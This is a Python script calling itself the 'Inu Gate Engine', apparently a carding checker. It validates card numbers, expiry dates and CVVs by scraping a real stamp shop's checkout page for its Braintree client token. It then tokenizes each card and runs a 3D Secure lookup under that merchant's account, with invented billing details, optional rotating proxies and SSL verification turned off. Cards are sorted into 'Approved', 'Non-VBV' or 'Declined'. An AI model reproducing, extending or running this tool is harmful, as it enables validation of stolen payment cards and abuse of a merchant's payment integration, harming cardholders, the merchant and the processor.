"""
Inu Gate Engine - Standalone Braintree CCN Auth ($0.00)
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import aiohttp
import time
import json
import base64
import random
import uuid
import re

_cached_fingerprint = None
_cache_expiry = 0

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

async def _get_auth_fingerprint(session, proxy_url=None):
    global _cached_fingerprint, _cache_expiry
    now = time.time()
    if _cached_fingerprint and now < _cache_expiry:
        return _cached_fingerprint
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    try:
        async with session.get('https://www.makistamps.com/checkout/', headers=headers, proxy=proxy_url) as r:
            resp_text = await r.text()
    except Exception:
        try:
            async with session.get('https://www.makistamps.com/checkout/', headers=headers) as r:
                resp_text = await r.text()
        except Exception:
            return None
    
    match = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', resp_text)
    if not match:
        return None
    
    try:
        decoded = base64.b64decode(match.group(1)).decode()
        data = json.loads(decoded)
        fp = data.get("authorizationFingerprint")
        if fp:
            _cached_fingerprint = fp
            _cache_expiry = now + 1500
        return fp
    except Exception:
        return None

async def check_card_inu(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    Native execution of Inu Gate: Braintree CCN Auth ($0.00).
    Returns (is_live, status_str, response_str, raw_json)
    """
    proxy_url = _format_proxy(proxy_url)
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)
    bin_number = cc[:6]

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Scrape Braintree Client Fingerprint
            fp = await _get_auth_fingerprint(session, proxy_url)
            if not fp:
                return False, "Declined! ❌", "Failed to retrieve Braintree Token", "{}"

            # 2. Tokenize Card via Braintree GraphQL
            gql_headers = {
                'authorization': f'Bearer {fp}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            }
            gql_payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            try:
                async with session.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload, proxy=proxy_url) as r:
                    gql_resp = await r.json()
            except Exception:
                async with session.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_payload) as r:
                    gql_resp = await r.json()

            tokencc = (gql_resp.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
            if not tokencc:
                err = ""
                if isinstance(gql_resp, dict) and 'errors' in gql_resp:
                    err = gql_resp['errors'][0].get('message', 'GraphQL Error')
                return False, "Declined! ❌", f"Tokenize Failed: {err}" if err else "Card Tokenize Failed", json.dumps(gql_resp)

            # 3. Perform 3DS/CCN Auth Lookup
            lookup_headers = {
                'content-type': 'application/json',
                'origin': 'https://www.makistamps.com',
                'referer': 'https://www.makistamps.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            }
            lookup_payload = {
                'amount': '0.00',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en-US',
                'browserScreenHeight': 900,
                'browserScreenWidth': 1440,
                'browserTimeZone': -300,
                'deviceChannel': 'Browser',
                'additionalInfo': {
                    'billingLine1': '5 Lady Rd',
                    'billingCity': 'Edinburgh',
                    'billingPostalCode': 'EH16 5PA',
                    'billingCountryCode': 'GB',
                    'email': 'testinguser99@gmail.com',
                },
                'bin': bin_number,
                'dfReferenceId': '0_dae63dbd-1418-47e8-8188-de3dca30ead3',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.133.0',
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': fp,
                'braintreeLibraryVersion': 'braintree/web/3.133.0',
                '_meta': {
                    'merchantAppId': 'www.makistamps.com',
                    'platform': 'web',
                    'sdkVersion': '3.133.0',
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
            }

            lookup_url = f'https://api.braintreegateway.com/merchants/5hgzqgpcndn3fs4y/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
            try:
                async with session.post(lookup_url, headers=lookup_headers, json=lookup_payload, proxy=proxy_url) as r:
                    res_json = await r.json()
            except Exception:
                async with session.post(lookup_url, headers=lookup_headers, json=lookup_payload) as r:
                    res_json = await r.json()

            # 4. Determine Auth status
            try:
                statuscc = res_json["paymentMethod"]["threeDSecureInfo"]["status"]
                if statuscc in ['authenticate_successful', 'authenticate_attempt_successful', 'authenticate_successful_issuer_not_participating']:
                    return True, "Approved! ✅", f"3DS Passed ({statuscc})", json.dumps(res_json)
                elif statuscc in ['lookup_not_enrolled', 'lookup_bypassed']:
                    return True, "Approved! ✅", f"Non-VBV ({statuscc})", json.dumps(res_json)
                elif statuscc in ['challenge_required', 'authenticate_rejected']:
                    return False, "Declined! ❌", f"3D Challenge Required ({statuscc})", json.dumps(res_json)
                else:
                    return False, "Declined! ❌", f"Status: {statuscc}", json.dumps(res_json)
            except KeyError:
                err_msg = res_json.get('error', {}).get('message', '3DS Lookup Failed')
                return False, "Declined! ❌", err_msg, json.dumps(res_json)

    except Exception as e:
        return False, "Error! ⚠️", str(e), "{}"

if __name__ == '__main__':
    test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
    p = test_card.split('|')
    print(f"[*] Running Native Test of Inu Gate on: {test_card}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_inu(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    print(f"Status: {status} | Response: {response} | Time: {elapsed}s")
